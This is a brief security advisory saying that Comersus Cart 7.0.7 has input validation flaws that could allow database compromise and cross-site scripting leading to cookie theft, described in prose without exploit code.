Comersus Cart is affected by multiple input validation vulnerabilities.

A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.

The attacker may also leverage this issue to execute arbitrary code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.

Comersus Cart 7.0.7 is vulnerable; other versions may also be affected.
